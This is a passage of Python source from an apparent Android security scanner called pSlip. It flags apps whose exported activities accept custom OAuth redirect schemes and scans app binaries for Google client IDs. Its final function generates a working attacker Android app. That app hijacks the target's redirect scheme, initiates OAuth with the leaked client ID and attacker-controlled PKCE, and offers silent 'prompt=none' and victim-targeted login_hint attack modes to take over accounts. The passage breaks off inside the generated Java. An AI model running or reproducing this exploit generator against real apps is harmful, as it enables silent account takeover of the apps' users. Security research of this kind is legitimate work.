            # not substring - 'com.googleusercontent' must not match the full provider scheme)
            already_covered = any(scheme == p['scheme'] for p in found_providers)
            if not already_covered:
                if scheme in callback_schemes:
                    detail = 'AppAuth + custom scheme (://callback pattern)'
                elif meta_scheme_keys:
                    detail = 'AppAuth + custom scheme (via ' + ', '.join(meta_scheme_keys) + ')'
                else:
                    detail = 'AppAuth + custom scheme (not App Links)'

                generic_findings.append({
                    'type': 'OAUTH_SCHEME_HIJACK',
                    'severity': 'HIGH',
                    'scheme': scheme,
                    'detail': detail,
                    'indicators': oauth_hits,
                })

    # If AppAuth found but no schemes resolved at all
    # Only fire if we saw the actual class name, not just the library string 'appauth'
    # (library name can appear in build metadata without the activity being present).
    if has_redirect_activity and not oauth_schemes and not found_providers:
        generic_findings.append({
            'type': 'OAUTH_APPAUTH_DETECTED',
            'severity': 'MEDIUM',
            'scheme': 'unknown (manual review needed)',
            'detail': 'AppAuth library detected - verify redirect scheme manually',
            'indicators': oauth_hits,
        })

    found_providers = _dedup_providers(found_providers)
    generic_findings = _dedup_generic_findings(generic_findings)
    return found_providers, generic_findings, app_schemes


def extract_oauth_providers_androguard(apk_path):
    """
    v2 STRUCTURAL manifest analysis via androguard.
    
    v1 only looked for RedirectUriReceiverActivity (the AppAuth library class).
    v2 scans EVERY exported activity for the actual anti-pattern:
    
      exported=true + intent-filter with:
        - android.intent.action.VIEW
        - android.intent.category.BROWSABLE
        - <data android:scheme="X"> where X is not http/https
        - NO android:autoVerify="true"
    
    This catches:
      - AppAuth (RedirectUriReceiverActivity)
      - Hand-rolled OAuth callbacks (OAuthCallbackActivity, etc.)
      - Any exported activity that accepts custom scheme deep links
        from the browser (the actual attack surface)
    
    Three-tier classification:
      CRITICAL: scheme matches provider regex (Google/FB/MS Client ID leaked)
               -> active flow POC defeats PKCE
      HIGH:    activity name contains OAuth keywords (auth, redirect, callback...)
               -> passive scheme-claim POC
      INFO:    custom BROWSABLE scheme, no OAuth keywords
               -> deep link, may or may not be OAuth. report only.
    
    Returns: (package, providers, generic_findings, app_schemes)
    """
    from androguard.core.apk import APK
    import logging
    logging.disable(logging.CRITICAL)  # Suppress androguard debug noise

    apk = APK(apk_path)
    manifest = apk.get_android_manifest_xml()
    ns = '{http://schemas.android.com/apk/res/android}'

    package = apk.get_package() or 'unknown'

    found_providers = []
    generic_findings = []
    app_schemes = set()

    # OAuth-related keywords in activity names
    OAUTH_ACTIVITY_KEYWORDS = (
        'redirect', 'callback', 'oauth', 'auth', 'login', 'signin',
        'sso', 'token', 'appauth', 'openid',
    )

    # Third-party SDK activity-class namespaces. When the redirect receiver lives
    # in one of these packages it is the SDK's own internal redirect handler, not
    # the host app's OAuth flow - claiming its scheme hijacks the SDK on its own
    # behalf, not the app's account session. These flooded v3.0 results:
    #   com.google.firebase.auth.internal.RecaptchaActivity  (scheme=recaptcha)
    #   com.stripe.android.financialconnections...RedirectActivity (scheme=stripe)
    #   com.plaid.internal.LinkRedirectActivity (scheme=plaid)
    #   com.mercadolibre.android...RouterActivity (scheme=mercadopago)
    # 392 of 810 v3.0 HIGH findings were exactly this pattern.
    SDK_ACTIVITY_PREFIXES = (
        'com.stripe.', 'com.plaid.', 'com.mercadolibre.',
        'com.mercadopago.android.', 'com.facebook.', 'com.amazon.',
        'io.intercom.', 'com.braze.', 'com.adjust.', 'com.appsflyer.',
        'com.onesignal.', 'zendesk.', 'com.salesforce.', 'com.microsoft.',
        'com.twilio.', 'com.revenuecat.', 'com.paypal.', 'com.squareup.',
        'com.google.android.gms.', 'com.google.firebase.',
        'com.google.android.recaptcha.', 'androidx.',
        'com.linecorp.', 'com.kakao.', 'com.vk.', 'com.yandex.',
    )

    def _is_sdk_activity(activity_class):
        # net.openid.appauth shell IS the app's own OAuth redirect receiver (AppAuth
        # is how the app does OAuth), so it must NOT be excluded - only genuine
        # third-party-SDK redirect receivers are.
        if activity_class.startswith('net.openid.appauth'):
            return False
        return any(activity_class.startswith(p) for p in SDK_ACTIVITY_PREFIXES)

    # Scan every <activity> in the manifest
    for activity in manifest.findall('.//activity'):
        name = activity.get(f'{ns}name', '')
        exported = activity.get(f'{ns}exported', '')

        if exported != 'true':
            continue

        # Skip third-party SDK redirect receivers (recaptcha/stripe/plaid/etc) - 
        # not the host app's OAuth flow.
        if _is_sdk_activity(name):
            continue

        name_lower = name.lower()

        # Check each intent-filter on this activity
        for intent_filter in activity.findall('intent-filter'):
            # Must have VIEW action
            has_view = any(
                a.get(f'{ns}name', '') == 'android.intent.action.VIEW'
                for a in intent_filter.findall('action')
            )
            if not has_view:
                continue

            # Must have BROWSABLE category
            has_browsable = any(
                c.get(f'{ns}name', '') == 'android.intent.category.BROWSABLE'
                for c in intent_filter.findall('category')
            )
            if not has_browsable:
                continue

            # Check autoVerify on the intent-filter
            auto_verify = intent_filter.get(f'{ns}autoVerify', '')

            # Extract custom schemes (not http/https)
            for data in intent_filter.findall('data'):
                scheme = data.get(f'{ns}scheme', '')
                host = data.get(f'{ns}host', '')
                path = data.get(f'{ns}path', '')
                pathPrefix = data.get(f'{ns}pathPrefix', '')
                pathPattern = data.get(f'{ns}pathPattern', '')
                # Resolve the best path value available
                redirect_path = path or pathPrefix or pathPattern or ''

                if not scheme or scheme in ('http', 'https'):
                    continue

                # --- Scheme sanity gates ---
                # Gate 1: Resource reference - unresolved @7F... string resource.
                # Androguard sometimes returns the raw resource ID instead of the
                # resolved string value when the APK's resources.arsc is obfuscated.
                # These are never valid OAuth redirect schemes.
                if scheme.startswith('@'):
                    continue

                # Gate 2: SDK placeholder and third-party SDK schemes.
                # These are registered by identity/payment SDKs as templates or
                # internal redirects - not exploitable as the target app's OAuth flow.
                SDK_PLACEHOLDER_SCHEMES = {
                    # Third-party SDK redirect schemes (not the app's own OAuth flow).
                    # These flooded v3.0 results via SDK redirect-receiver activities.
                    'recaptcha', 'stripe', 'plaid', 'mercadopago', 'meli',
                    'fbconnect', 'kakaotalk', 'kakao', 'naver3rdpartylogin',
                    'vkid', 'samsungpay', 'samsungwallet', 'tmap',
                    'squarespace-app', 'yelp-app-indexing',
                    # Identity SDK placeholders (Janrain, Gigya, Auth0, OneLogin etc.)
                    'genericidp', 'identityprovider', 'genericprovider',
                    'idpredirect', 'authprovider', 'oauthprovider',
                    # Third-party auth SDK schemes (not the app's own flow)
                    'lineauth',       # LINE SDK
                    'msauth',         # Microsoft MSAL
                    'amzn',           # Amazon Login
                    'spaysdk',        # Samsung Pay
                    'musicsdk',       # Apple Music / MusicKit
                    'juspayexternalapp',  # Juspay payment SDK
                    'link-popup',     # Stripe Link
                    'stripe-auth',    # Stripe OAuth
                    'scgatewayredirect',  # SCB payment gateway
                    'signinwithapple',    # Apple Sign In relay (iOS SDK stub)
                    'okauth',         # OK.ru SDK
                    'progress.auth',  # Progress Telerik
                }
                if scheme.lower() in SDK_PLACEHOLDER_SCHEMES:
                    continue

                # Gate 3: Must be a valid scheme character set (RFC 3986 §3.1).
                # Catches any remaining garbage strings that slipped through.
                if not re.match(r'^[a-zA-Z][a-zA-Z0-9+.\-]*$', scheme):
                    continue

                # --- TIER 1: Provider Client ID in scheme ---
                matched_provider = False
                for provider in OAUTH_PROVIDERS:
                    match = provider['scheme_re'].search(scheme)
                    if match:
                        client_id = match.group(1)
                        found_providers.append({
                            'provider': provider['name'],
                            'client_id': client_id,
                            'scheme': scheme,
                            'redirect_host': host,
                            'redirect_path': redirect_path,
                            'auth_endpoint': provider['auth_endpoint'],
                            'token_endpoint': provider['token_endpoint'],
                            'default_scopes': provider['default_scopes'],
                            'supports_pkce': provider['supports_pkce'],
                            'client_secret_required': provider['client_secret_required'],
                            'activity': name,
                            'autoVerify': auto_verify == 'true',
                        })
                        matched_provider = True
                        break

                if matched_provider:
                    continue

                # --- TIER 2: OAuth keyword in activity name ---
                is_oauth_activity = any(kw in name_lower for kw in OAUTH_ACTIVITY_KEYWORDS)

                if is_oauth_activity:
                    # autoVerify=true means the OS enforces App Links verification - 
                    # a competing app cannot register the same scheme.  Not hijackable;
                    # skip entirely to avoid FPs.
                    if auto_verify == 'true':
                        continue

                    app_schemes.add(scheme)
                    detail = f'{name} (exported=true, custom scheme, no autoVerify - VULNERABLE)'

                    # Detect prefix-style redirect_uri validation risk.
                    # If the manifest registers scheme://host/some/path, many AS
                    # implementations validate by prefix - so scheme://host/some/path/../../attacker
                    # or scheme://host/some/path.evil also pass.
                    # Flag when there is a non-trivial path so the POC can try variations.
                    has_path_prefix_risk = bool(redirect_path and len(redirect_path) > 1)

                    generic_findings.append({
                        'type': 'OAUTH_SCHEME_HIJACK',
                        'severity': 'HIGH',
                        'scheme': scheme,
                        'redirect_host': host,
                        'redirect_path': redirect_path,
                        'detail': detail,
                        'indicators': [f'activity={name}', 'structural parse'],
                        'activity': name,
                        'autoVerify': False,
                        '_prefix_risk': has_path_prefix_risk,
                    })
                    continue

                # --- TIER 3: Custom BROWSABLE scheme, no OAuth keywords ---
                # Require at least one corroborating signal before reporting:
                #   (a) scheme itself contains an OAuth keyword, OR
                #   (b) host/path contains an OAuth keyword, OR
                #   (c) scheme is a reverse-domain (3+ components), OR
                #   (d) scheme shares a distinctive token with the app's package name
                #       (e.g. package com.example.app -> scheme exampleapp)
                # Without any signal this is just a deep link - skip to avoid INFO noise.
                #
                # Regression guard: this gate must never suppress the two shapes
                # that are genuine app-owned redirects:
                #   com.example.app   scheme=exampleapp                 (package-affinity)
                #   com.example.app   scheme=com.example.app.android    (reverse-domain 4-part)
                scheme_lower = scheme.lower()
                host_path_lower = (host + redirect_path).lower()
                OAUTH_SCHEME_KEYWORDS = ('oauth', 'auth', 'callback', 'redirect', 'login',
                                         'signin', 'sso', 'token', 'openid')
                has_scheme_signal = any(kw in scheme_lower for kw in OAUTH_SCHEME_KEYWORDS)
                has_hostpath_signal = any(kw in host_path_lower for kw in OAUTH_SCHEME_KEYWORDS)
                # Reverse-domain custom scheme: 3 OR MORE dotted components
                # (com.example.app AND com.washingtonpost.rainbow.android both qualify).
                is_reverse_domain = bool(
                    re.match(r'^[a-z][a-z0-9]*(\.[a-z][a-z0-9]*){2,}$', scheme_lower)
                    and auto_verify != 'true'
                )
                # Package affinity: does the scheme contain a distinctive component of
                # the package name?  Catches app-specific single-word schemes that are
                # the app's own OAuth redirect (exampleapp <- com.example.app)
                # without flagging generic SDK schemes (which don't echo the package).
                pkg_tokens = [t for t in package.lower().split('.')
                              if len(t) >= 4 and t not in (
                                  'com', 'org', 'net', 'app', 'android', 'mobile',
                                  'free', 'pro', 'lite', 'plus')]
                # Concatenated package tail (e.g. 'exampleapp') and individual tokens
                scheme_alnum = re.sub(r'[^a-z0-9]', '', scheme_lower)
                has_pkg_affinity = False
                if pkg_tokens:
                    pkg_concat = ''.join(pkg_tokens)
                    # scheme matches the concatenated package tail, OR
                    # scheme contains a distinctive (len>=5) package token
                    if (scheme_alnum and (scheme_alnum == pkg_concat or
                            scheme_alnum in pkg_concat or pkg_concat in scheme_alnum)):
                        has_pkg_affinity = True
                    elif any(len(t) >= 5 and t in scheme_alnum for t in pkg_tokens):
                        has_pkg_affinity = True

                if not (has_scheme_signal or has_hostpath_signal or
                        is_reverse_domain or has_pkg_affinity):
                    continue  # No corroborating signal - skip; deep link FP

                if auto_verify == 'true':
                    continue  # App Links - not hijackable

                generic_findings.append({
                    'type': 'CUSTOM_BROWSABLE_SCHEME',
                    'severity': 'INFO',
                    'scheme': scheme,
                    'redirect_host': host,
                    'redirect_path': redirect_path,
                    'detail': f'{name} (exported=true, custom BROWSABLE scheme, no OAuth keywords - verify manually)',
                    'indicators': [f'activity={name}', 'structural parse'],
                    'activity': name,
                    'autoVerify': False,
                })

    # --- WebView deeplink chain detection ---
    # Pattern: an exported activity accepts a deeplink whose
    # target URL comes from a query/path parameter and loads it in an embedded
    # WebView. If the WebView lacks strict URL validation it becomes an open redirect
    # that can be used to deliver an OAuth authorize URL in the context of the
    # victim app's cookies - enabling prompt=none silent ATO without any user interaction.
    #
    # Detection heuristic: exported activity with a BROWSABLE intent-filter that
    # has an http/https scheme (or no scheme) AND whose name or the filter's data
    # host/path contains URL-parameter keywords (url, link, redirect, target, next).
    #
    # Recorded as CHAIN findings - not standalone vulns, but high-value
    # combinators when an OAuth scheme hijack is already present.
    URL_PARAM_KEYWORDS = ('url', 'link', 'redirect', 'target', 'next', 'navigate',
                          'goto', 'return', 'returnurl', 'returnto', 'continue',
                          'forward', 'dest', 'destination', 'ref', 'referer')
    webview_deeplinks = []
    for activity in manifest.findall('.//activity'):
        act_name = activity.get(f'{ns}name', '')
        act_exported = activity.get(f'{ns}exported', '')
        if act_exported != 'true':
            continue
        if _is_sdk_activity(act_name):
            continue
        act_name_lower = act_name.lower()
        for intent_filter in activity.findall('intent-filter'):
            has_view = any(
                a.get(f'{ns}name', '') == 'android.intent.action.VIEW'
                for a in intent_filter.findall('action')
            )
            if not has_view:
                continue
            has_browsable = any(
                c.get(f'{ns}name', '') == 'android.intent.category.BROWSABLE'
                for c in intent_filter.findall('category')
            )
            if not has_browsable:
                continue
            # Look for http/https data elements (browser-routed deeplinks)
            for data in intent_filter.findall('data'):
                d_scheme = data.get(f'{ns}scheme', '')
                d_host = data.get(f'{ns}host', '')
                d_path = data.get(f'{ns}pathPrefix',
                         data.get(f'{ns}path',
                         data.get(f'{ns}pathPattern', '')))
                combined = (act_name_lower + d_host.lower() + d_path.lower())
                # http/https BROWSABLE deeplinks that look like they carry a URL param
                if d_scheme in ('http', 'https', ''):
                    has_url_param = any(kw in combined for kw in URL_PARAM_KEYWORDS)
                    # Also flag if the path ends with a wildcard-style prefix
                    has_open_path = d_path == '' or d_path.endswith('/')
                    if has_url_param or (has_open_path and 'webview' in act_name_lower):
                        webview_deeplinks.append({
                            'activity': act_name,
                            'scheme': d_scheme or 'https',
                            'host': d_host,
                            'path': d_path,
                            'signal': 'url_param_keyword' if has_url_param else 'open_path+webview',
                        })

    # Only surface webview chains when a HIGH/CRITICAL OAuth finding is already
    # present - the deeplink is a delivery vehicle, not a standalone vuln, and
    # coupling it to an INFO-tier custom-scheme note would over-promote noise.
    _has_real_finding = bool(found_providers) or any(
        f.get('severity') in ('HIGH', 'CRITICAL') for f in generic_findings)
    if webview_deeplinks and _has_real_finding:
        # Dedup by (activity, host, path) and cap - apps commonly declare many
        # http/https deeplink filters; one chain note per distinct target is enough.
        _wv_seen = set()
        _wv_count = 0
        for wv in webview_deeplinks:
            wv_key = (wv['activity'], wv['host'], wv['path'])
            if wv_key in _wv_seen:
                continue
            _wv_seen.add(wv_key)
            if _wv_count >= 5:
                break
            _wv_count += 1
            generic_findings.append({
                'type': 'WEBVIEW_DEEPLINK_CHAIN',
                'severity': 'HIGH',
                'scheme': wv['scheme'],
                'redirect_host': wv['host'],
                'redirect_path': wv['path'],
                'detail': (
                    f"{wv['activity']} (exported=true, BROWSABLE http/https deeplink, "
                    f"URL-param signal: {wv['signal']}) - potential delivery vehicle "
                    f"for OAuth authorize URL via embedded WebView"
                ),
                'indicators': [f"activity={wv['activity']}", 'webview_chain'],
                'activity': wv['activity'],
                'autoVerify': False,
                '_webview_chain': True,
            })

    logging.disable(logging.NOTSET)

    # --- Cross-platform client_id detection ---
    # Scan DEX strings for Google client_ids NOT in the manifest.
    # These may be iOS/desktop client_ids that can be used on Android
    # to avoid scheme conflicts with the legitimate app.
    #
    # PERF FIX: v3.1.1 - uses lightweight regex over raw DEX bytes instead
    # of androguard.misc.AnalyzeAPK which does full disassembly + xref
    # building (minutes per large APK).  We only need string matching,
    # so reading the DEX files as raw bytes and searching with regex is
    # 100-1000x faster and produces identical results for this use case.
    manifest_client_ids = {p['client_id'] for p in found_providers if p['provider'] == 'google'}
    manifest_schemes = {p['scheme'] for p in found_providers}
    _xp_seen = set()  # client_ids already processed (same string repeats across DEX files)
    try:
        google_cid_re = re.compile(rb'(\d{10,12}-[a-z0-9]{32})\.apps\.googleusercontent\.com')
        with zipfile.ZipFile(str(apk_path), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('.dex'):
                    dex_bytes = zf.read(name)
                    for m in google_cid_re.finditer(dex_bytes):
                        full_id = m.group(0).decode('utf-8', errors='replace')
                        short_id = m.group(1).decode('utf-8', errors='replace')
                        # Skip if already captured from manifest
                        if any(short_id in cid for cid in manifest_client_ids):
                            continue
                        # Skip if already processed (same client_id repeats across DEX
                        # files and many times within one DEX) - avoids redundant URI
                        # scans and a bloated pre-dedup list.
                        if short_id in _xp_seen:
                            continue
                        _xp_seen.add(short_id)
                        # Derive the redirect scheme this client_id would use.
                        # Only report if NOT already registered in the manifest - 
                        # a scheme collision with the legit app triggers a disambiguation
                        # dialog, which reduces exploitability significantly.
                        project_number = short_id.split('-')[0]
                        derived_scheme = 'com.googleusercontent.apps.' + project_number
                        # Exact-match collision check: a manifest scheme equal to the
                        # derived scheme means the legit app already claims it (chooser
                        # dialog → lower impact). Substring would over-suppress.
                        if any(derived_scheme == ms for ms in manifest_schemes):
                            continue
                        # Scan DEX for the registered redirect URI for this client_id.
                        # Google AS validates redirect_uri by exact match - scheme:/ alone
                        # will be rejected if the iOS/desktop client registered a path.
                        xp_host = ''
                        xp_path = ''
                        uri_re = re.compile(
                            re.escape(derived_scheme.encode()) + rb'://([^\s\'"<>\x00]{1,200})'
                        )
                        for uri_m in uri_re.finditer(dex_bytes):
                            uri_tail = uri_m.group(1).decode('utf-8', errors='replace')
                            slash_idx = uri_tail.find('/')
                            if slash_idx != -1:
                                xp_host = uri_tail[:slash_idx]
                                xp_path = '/' + uri_tail[slash_idx + 1:]
                            else:
                                xp_host = uri_tail
                            if xp_host:
                                break

                        found_providers.append({
                            'provider': 'google',
                            'client_id': full_id.replace('.apps.googleusercontent.com', ''),
                            'scheme': derived_scheme,
                            'redirect_host': xp_host,
                            'redirect_path': xp_path,
                            'auth_endpoint': 'https://accounts.google.com/o/oauth2/v2/auth',
                            'token_endpoint': 'https://oauth2.googleapis.com/token',
                            'default_scopes': 'openid email profile',
                            'supports_pkce': True,
                            'client_secret_required': False,
                            'activity': 'CROSS_PLATFORM_IOS_CLIENT',
                            'autoVerify': False,
                            '_cross_platform': True,
                        })
    except Exception:
        pass

    # --- Classify the Google OAuth client type from shipped credentials ---
    # (actuator.sh "The Wrong Dropdown"). Runs before _dedup_providers so
    # _score_confidence sees the corrected client_secret flags.
    found_providers = _classify_google_client_type(found_providers, apk_path)

    found_providers = _dedup_providers(found_providers)
    generic_findings = _dedup_generic_findings(generic_findings)
    return package, found_providers, generic_findings, app_schemes


def generate_active_poc(package_name, providers, app_schemes, output_dir):
    """
    Generate an Android POC project with ACTIVE OAuth flow initiation.
    
    Unlike the passive POC (which just claims the scheme and waits),
    this POC:
    1. Claims all vulnerable redirect schemes
    2. Has a UI button per provider to INITIATE the OAuth flow
    3. Uses the leaked Client ID with attacker-controlled PKCE
    4. Catches the redirect and displays the auth code
    5. Includes token exchange code to complete the ATO
    """
    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', package_name)
    poc_dir = os.path.join(output_dir, f'poc_active_{safe_name}')
    src_dir = os.path.join(poc_dir, 'app', 'src', 'main', 'java', 'com', 'poc', 'activeoauth')
    os.makedirs(src_dir, exist_ok=True)
    os.makedirs(os.path.join(poc_dir, 'gradle', 'wrapper'), exist_ok=True)

    # Collect all scheme+host+path tuples to claim
    # Each entry: (scheme, host, path)
    all_redirect_info = {}  # scheme -> (host, path) from manifest
    for p in providers:
        host = p.get('redirect_host', '')
        path = p.get('redirect_path', '')
        all_redirect_info[p['scheme']] = (host, path)
    for scheme in app_schemes:
        if scheme not in all_redirect_info:
            all_redirect_info[scheme] = ('', '')

    # Build intent-filter blocks for each scheme, mirroring the target's host/path
    scheme_filters = []
    for scheme in sorted(all_redirect_info.keys()):
        host, path = all_redirect_info[scheme]
        data_attrs = f'android:scheme="{scheme}"'
        if host:
            data_attrs += f' android:host="{host}"'
        if path:
            data_attrs += f' android:path="{path}"'
        scheme_filters.append(f'''        <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data {data_attrs} />
            </intent-filter>''')

    filters_xml = '\n'.join(scheme_filters)

    # --- AndroidManifest.xml ---
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <application
        android:allowBackup="true"
        android:label="OAuth Active POC"
        android:theme="@android:style/Theme.Material.Light"
        android:usesCleartextTraffic="true">
        <activity
            android:name=".ActiveOAuthActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
{filters_xml}
        </activity>
    </application>
</manifest>'''

    # --- Build provider config as Java string ---
    # Construct redirect_uri from scheme://host/path (matching target manifest)
    provider_configs = []
    for p in providers:
        if p.get('_cross_platform'):
            # Cross-platform provider: redirect scheme is the iOS/desktop client's.
            # No app_scheme exists for it on Android. Use host/path recovered from
            # the DEX URI scan - Google AS validates by exact match, so scheme:/
            # alone will be rejected if the client registered a full path.
            redirect_scheme = p['scheme']
            r_host = p.get('redirect_host', '')
            r_path = p.get('redirect_path', '')
        else:
            # Determine redirect scheme: prefer the app's primary OAuth redirect scheme
            redirect_scheme = sorted(app_schemes)[0] if app_schemes else p['scheme']
            # Pull host/path from the redirect info we collected
            r_host, r_path = all_redirect_info.get(redirect_scheme, ('', ''))
            # If using the app_scheme but it has no host/path, try the provider's own data
            if not r_host and redirect_scheme != p['scheme']:
                r_host = p.get('redirect_host', '')
                r_path = p.get('redirect_path', '')
        # Build the full redirect_uri: scheme://host/path
        if r_host:
            redirect_uri = f'{redirect_scheme}://{r_host}{r_path}'
        else:
            # No host found - scheme:/ is last resort; cross-platform POC will warn.
            redirect_uri = f'{redirect_scheme}:/'
        # Confidential (Web application) clients require the client_secret on the
        # code->token exchange. Pass the recovered value; if presence was detected
        # but the value not isolated, leave a clear placeholder for the operator.
        csecret = p.get('client_secret_value') or ''
        if p.get('client_secret_present') and not csecret:
            csecret = 'PASTE_CLIENT_SECRET_FROM_APK'
        csecret_java = csecret.replace('\\', '\\\\').replace('"', '\\"')
        provider_configs.append(
            f'        addProvider("{p["provider"]}", '
            f'"{p["client_id"]}", '
            f'"{p["auth_endpoint"]}", '
            f'"{p["token_endpoint"]}", '
            f'"{p["default_scopes"]}", '
            f'"{redirect_uri}", '
            f'{str(p["supports_pkce"]).lower()}, '
            f'{str(p["client_secret_required"]).lower()}, '
            f'"{csecret_java}");'
        )
    provider_init = '\n'.join(provider_configs)

    # --- ActiveOAuthActivity.java ---
    activity = f'''package com.poc.activeoauth;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.widget.*;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Active OAuth Flow POC - defeats PKCE by using leaked Client ID
 * with attacker-controlled code_verifier/code_challenge.
 *
 * Target: {package_name}
 * Generated by pSlip
 */
public class ActiveOAuthActivity extends Activity {{

    private static final String TAG = "ActiveOAuth-POC";
    private TextView outputView;
    private LinearLayout buttonContainer;
    private EditText loginHintInput;

    // Attacker-controlled PKCE state
    private String currentCodeVerifier;
    private String currentProvider;
    private String currentTokenEndpoint;
    private String currentClientId;
    private String currentRedirectUri;
    private String currentClientSecret;

    // Provider configs extracted from target manifest
    private final List<Map<String, String>> providers = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("Active OAuth ATO POC\\nTarget: {package_name}");
        title.setTextSize(18f);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 24);
        root.addView(title);

        buttonContainer = new LinearLayout(this);
        buttonContainer.setOrientation(LinearLayout.VERTICAL);

        // Login hint input for targeted attacks
        TextView hintLabel = new TextView(this);
        hintLabel.setText("Victim email (for targeted attack):");
        hintLabel.setPadding(0, 16, 0, 4);
        root.addView(hintLabel);

        loginHintInput = new EditText(this);
        loginHintInput.setHint("victim@gmail.com");
        loginHintInput.setSingleLine(true);
        root.addView(loginHintInput);

        root.addView(buttonContainer);

        outputView = new TextView(this);
        outputView.setPadding(0, 24, 0, 0);
        outputView.setTextSize(13f);
        outputView.setTextIsSelectable(true);
        root.addView(outputView);

        scroll.addView(root);
        setContentView(scroll);

        // Register providers extracted from target APK
{provider_init}

        // Create launch buttons for each provider - multiple attack modes
        for (Map<String, String> p : providers) {{
            // Standard attack (consent screen)
            Button btn = new Button(this);
            String label = p.get("name").toUpperCase() + " - Standard Attack";
            if ("true".equals(p.get("secret_required"))) {{
                label += " (needs secret)";
            }}
            btn.setText(label);
            btn.setOnClickListener(v -> launchOAuthFlow(p, "standard"));
            buttonContainer.addView(btn);

            // Silent attack (prompt=none, zero-click if SSO cookie exists)
            Button silentBtn = new Button(this);
            silentBtn.setText(p.get("name").toUpperCase() + " - Silent Attack (prompt=none)");
            silentBtn.setOnClickListener(v -> launchOAuthFlow(p, "silent"));
            buttonContainer.addView(silentBtn);

            // Targeted attack (with login_hint)
            Button targetedBtn = new Button(this);
            targetedBtn.setText(p.get("name").toUpperCase() + " - Targeted Attack (login_hint)");
            targetedBtn.setOnClickListener(v -> {{
                if (loginHintInput.getText().toString().isEmpty()) {{
                    log("[!] Enter victim email in the text field above first");
                }} else {{
                    launchOAuthFlow(p, "targeted");
                }}
            }});
            buttonContainer.addView(targetedBtn);

            // Separator
            TextView sep = new TextView(this);
            sep.setText("---");
            sep.setGravity(Gravity.CENTER);
            sep.setPadding(0, 8, 0, 8);
            buttonContainer.addView(sep);
        }}

        // Check if we're being launched from a redirect
        handleIntent(getIntent());
    }}

    private void addProvider(String name, String clientId, String authEndpoint,
                              String tokenEndpoint, String scopes,
                              String redirectUri, boolean supportsPkce,
                              boolean secretRequired, String clientSecret) {{
        Map<String, String> p = new HashMap<>();
        p.put("name", name);
        p.put("client_id", clientId);
        p.put("auth_endpoint", authEndpoint);
        p.put("token_endpoint", tokenEndpoint);
        p.put("scopes", scopes);
        p.put("redirect_uri", redirectUri);
        p.put("supports_pkce", String.valueOf(supportsPkce));
        p.put("secret_required", String.valueOf(secretRequired));
        p.put("client_secret", clientSecret == null ? "" : clientSecret);
        providers.add(p);
    }}

    /**
     * ACTIVE ATTACK: Initiate OAuth flow with attacker-controlled PKCE state.
     * Three modes:
     *   "standard"  - normal consent screen (1 tap)
     *   "silent"    - prompt=none (0 taps if SSO cookie exists)
     *   "targeted"  - login_hint to skip account picker
     */
    private void launchOAuthFlow(Map<String, String> provider, String mode) {{
        currentProvider = provider.get("name");
        currentClientId = provider.get("client_id");
        currentTokenEndpoint = provider.get("token_endpoint");
        String authEndpoint = provider.get("auth_endpoint");
        String scopes = provider.get("scopes");
        boolean supportsPkce = "true".equals(provider.get("supports_pkce"));

        // Use the exact redirect_uri from the target app's manifest (scheme://host/path)
        currentRedirectUri = provider.get("redirect_uri");
        currentClientSecret = provider.get("client_secret");
        if (currentRedirectUri.endsWith(":/")) {{
            log("[!] WARNING: redirect_uri is scheme:/ only - no host/path found in DEX.");
            log("[!] Google AS may reject this. Check the iOS/desktop client registration");
            log("[!] and update redirect_uri in addProvider() to the exact registered value.");
        }}

        // Generate PKCE pair - ATTACKER CONTROLS BOTH SIDES
        currentCodeVerifier = generateCodeVerifier();
        String codeChallenge = generateCodeChallenge(currentCodeVerifier);

        log("[*] Initiating " + currentProvider.toUpperCase() + " OAuth flow");
        log("[*] Mode:      " + mode.toUpperCase());
        log("[*] Client ID: " + currentClientId);
        log("[*] Redirect:  " + currentRedirectUri);
        log("[*] Verifier:  " + currentCodeVerifier.substring(0, 16) + "...");
        log("[*] Challenge: " + codeChallenge.substring(0, 16) + "...");

        Uri.Builder builder = Uri.parse(authEndpoint).buildUpon()
            .appendQueryParameter("client_id", currentClientId)
            .appendQueryParameter("redirect_uri", currentRedirectUri)
            .appendQueryParameter("response_type", "code")
            .appendQueryParameter("scope", scopes)
            .appendQueryParameter("access_type", "offline");

        if (supportsPkce) {{
            builder.appendQueryParameter("code_challenge", codeChallenge)
                   .appendQueryParameter("code_challenge_method", "S256");
        }}

        // Add state for CSRF (attacker controls this too)
        String state = generateRandomString(16);
        builder.appendQueryParameter("state", state);

        // Apply attack mode parameters
        switch (mode) {{
            case "silent":
                // prompt=none: skip ALL UI if SSO cookie exists
                // Zero-click if user previously signed into any Google app via Chrome
                builder.appendQueryParameter("prompt", "none");
                log("[*] Using prompt=none - zero-click if SSO cookie exists");
                break;
            case "targeted":
                // login_hint: pre-fill victim email, skip account picker
                String hint = loginHintInput.getText().toString().trim();
                if (!hint.isEmpty()) {{
                    builder.appendQueryParameter("login_hint", hint);
                    log("[*] Using login_hint: " + hint);
                }}
                // Also use prompt=consent to force a clean consent screen
                builder.appendQueryParameter("prompt", "consent");
                break;
            default:
                // Standard: let Google decide what to show
                log("[*] Standard flow - consent screen will appear");
                break;
        }}

        Uri authUri = builder.build();
        log("[*] Auth URL: " + authUri.toString() + "\\n");

        startActivity(new Intent(Intent.ACTION_VIEW, authUri));
    }}

    @Override
    protected void onNewIntent(Intent intent) {{
        super.onNewIntent(intent);
        handleIntent(intent);
    }}

    private void handleIntent(Intent intent) {{
